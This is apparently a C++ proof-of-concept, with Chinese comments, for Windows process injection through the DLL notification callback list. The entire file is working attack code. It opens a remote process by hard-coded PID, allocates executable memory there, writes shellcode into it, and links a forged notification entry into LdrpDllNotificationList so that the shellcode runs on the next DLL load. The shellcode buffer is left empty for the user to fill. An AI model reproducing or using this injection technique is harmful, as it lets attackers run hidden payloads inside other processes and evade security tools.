//进程注入回调函数的演示代码
#include <Windows.h>
#include <stdio.h>
#include "nt.h"
#include <cstdint>


// 回调函数
VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
    return;
}

PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = 0;


    HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");

    if (hNtdll != NULL) {

        // 找到LdrRegisterDllNotification函数
        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");

        // 找到 LdrUnregisterDllNotification函数
        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

        // 将回调函数注册为 DLL 通知回调
        PVOID cookie;
        NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
        if (status == 0) {
            printf("[+] Successfully registered dummy callback\n");

            // Cookie is the last callback registered so its Flink holds the head of the list.
            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
            printf("[+] Found LdrpDllNotificationList head: %p\n", head);

            // 卸载回调函数
            status = pLdrUnregisterDllNotification(cookie);
            if (status == 0) {
                printf("[+] Successfully unregistered dummy callback\n");
            }
        }
    }

    return head;
}

LPVOID GetNtdllBase(HANDLE hProc) {

    // 找到 NtQueryInformationProcess函数
    NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress((HMODULE)GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    // 获取远程进程的PEB
    PROCESS_BASIC_INFORMATION info;
    NTSTATUS status = pNtQueryInformationProcess(hProc, ProcessBasicInformation, &info, sizeof(info), 0);
    ULONG_PTR ProcEnvBlk = (ULONG_PTR)info.PebBaseAddress;

    // 读取远程Ldr的地址指针
    ULONG_PTR ldrAddress = 0;
    BOOL res = ReadProcessMemory(hProc, ((char*)ProcEnvBlk + offsetof(_PEB, pLdr)), &ldrAddress, sizeof(ULONG_PTR), nullptr);

    // 读取远程 InLoadOrderModuleList头的地址
    ULONG_PTR ModuleListAddress = 0;
    res = ReadProcessMemory(hProc, ((char*)ldrAddress + offsetof(PEB_LDR_DATA, InLoadOrderModuleList)), &ModuleListAddress, sizeof(ULONG_PTR), nullptr);

    //读取远程 InLoadOrderModuleList中的第一个LDR_DATA_TABLE_ENTRY条目
    LDR_DATA_TABLE_ENTRY ModuleEntry = { 0 };
    res = ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);

    LIST_ENTRY* ModuleList = (LIST_ENTRY*)&ModuleEntry;
    WCHAR name[1024];
    ULONG_PTR nextModuleAddress = 0;

    LPWSTR sModuleName = (LPWSTR)L"ntdll.dll";

    // 通过读取远程 InLoadOrderModuleList中的第一个 LDR_DATA_TABLE_ENTRY条目开始遍历查找
    for (ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
        // 当捕获到最后一个条目时停止
        (ULONG_PTR)(ModuleList->Flink) != ModuleListAddress;
        //读取list中下一个条目
        ReadProcessMemory(hProc, (LPCVOID)nextModuleAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr))
    {

        //将 dll name的缓冲区清零
        memset(name, 0, sizeof(name));

        // 将远程BaseDllName（UNICODE_STRING）的缓冲区读入缓冲区“name”
        ReadProcessMemory(hProc, (LPCVOID)ModuleEntry.BaseDllName.pBuffer, &name, ModuleEntry.BaseDllName.Length, nullptr);

        // 检查当前模块的名称是否为ntdll.dll，如果是，则返回DllBase地址
        if (wcscmp(name, sModuleName) == 0) {
            return (LPVOID)ModuleEntry.DllBase;
        }

        // 否则，设置 nextModuleAddress 为指向list中的下一个entry条目
        ModuleList = (LIST_ENTRY*)&ModuleEntry;
        nextModuleAddress = (ULONG_PTR)(ModuleList->Flink);
    }
    return 0;
}



void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
    printf("\n");
    printf("[+] Remote DLL Notification Block List:\n");

    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存
    BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // 从远程进程中读取其头部条目
    ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    LPVOID currentEntryAddress = remoteHeadAddress;
    do {

        // 打印 LDR_DLL_NOTIFICATION_ENTRY 及其回调函数的地址
        printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        // 获取list中下一个回调的地址
        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;

        // 读取list中的下一个回调
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // 当再次到达列表的头部时停止

    free(entry);

    printf("\n");
}

unsigned char shellcode[] =
"";  //填写shellcode代码

int main()
{
    // 获取本地LdrpDllNotificationList的头地址
    LPVOID localHeadAddress = (LPVOID)GetDllNotificationListHead();
    printf("[+] Local LdrpDllNotificationList head address: 0x%p\n", localHeadAddress);

    // 获取本地NTDLL基准地址
    HANDLE hNtdll = GetModuleHandleA("NTDLL.dll");
    printf("[+] Local NTDLL base address: 0x%p\n", hNtdll);

    // 计算 LdrpDllNotificationList 相对于 NTDLL 基址的偏移量
    int64_t offsetFromBase = (BYTE*)localHeadAddress - (BYTE*)hNtdll;
    printf("[+] LdrpDllNotificationList offset from NTDLL base: 0x%IX\n", offsetFromBase);

    // Open handle to remote process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2756);
    printf("[+] Got handle to remote process\n");

    // 获取远程NTDLL基地址
    LPVOID remoteNtdllBase = GetNtdllBase(hProc);
    LPVOID remoteHeadAddress = (BYTE*)remoteNtdllBase + offsetFromBase;
    printf("[+] Remote LdrpDllNotificationList head address 0x%p\n", remoteHeadAddress);

    // 打印远程 Dll 通知列表
    PrintDllNotificationList(hProc, remoteHeadAddress);

    // 在远程进程中为我们的 shellcode 分配内存
    LPVOID shellcodeEx = VirtualAllocEx(hProc, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory for shellcode in remote process: 0x%p\n", shellcodeEx);

    // 将shellcode写入远程进程中
    WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);
    printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);

    // 创建一个新的LDR_DLL_NOTIFICATION_ENTRY条目
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;

    // 设置 Callback 属性指向 shellcode
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)shellcodeEx;

    // 希望新条目成为列表中的第一个，所以新条目的List.Blink属性应该指向列表的头部
    newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;

    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存缓冲区
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // 从远程进程读取头条目
    ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    // 设置新条目的 List.Flink 属性为指向list中原来第一个条目
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;

    // 分配内存
    LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);

    // 将新条目写入远程进程中
    WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    printf("[+] Net Entrty has been written to remote process: 0x%p\n", newEntryAddress);

    // 用新条目的地址计算我们需要覆写的地址
    // 上一个条目的 Flink（头）和下一个条目的 Blink
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)remoteHeadAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));

    // 用新条目的地址覆写前一个条目的 Flink
    WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);

    // 用新条目的地址覆写下一个条目的 Blink
    WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);

    printf("[+] LdrpDllNotificationList has been modified.\n");
    printf("[+] Our new entry has been inserted.\n");


    PrintDllNotificationList(hProc, remoteHeadAddress);
}
